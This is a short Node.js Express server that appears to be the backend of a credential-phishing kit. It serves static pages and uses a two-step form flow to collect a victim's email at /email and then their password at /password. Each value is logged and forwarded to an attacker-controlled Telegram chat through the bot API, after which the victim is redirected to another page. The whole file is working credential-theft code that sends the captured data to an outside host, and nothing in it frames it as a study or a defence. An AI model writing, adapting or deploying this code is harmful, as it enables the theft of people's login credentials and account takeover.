import express from 'express';
import bodyParser from 'body-parser';
import fetch from 'node-fetch';
import dotenv from 'dotenv';

dotenv.config();

const app = express();

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
  console.error('Error: Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in .env file');
  process.exit(1);
}

app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files from the "public" directory
app.use(express.static('public'));

async function sendToTelegram(message) {
  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
      }),
    });

    if (!response.ok) {
      console.error('Failed to send message to Telegram:', await response.text());
    }
  } catch (error) {
    console.error('Error sending message to Telegram:', error);
  }
}

app.post('/email', async (req, res) => {
  const email = req.body.email;
  console.log('Email received:', email);

  await sendToTelegram(`Email received: ${email}`);
  res.redirect('/password.html');
});

app.post('/password', async (req, res) => {
  const password = req.body.password;
  console.log('Password received:', password);

  await sendToTelegram(`Password received: ${password}`);
  res.redirect('index.html');
});

const PORT = 3000;
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});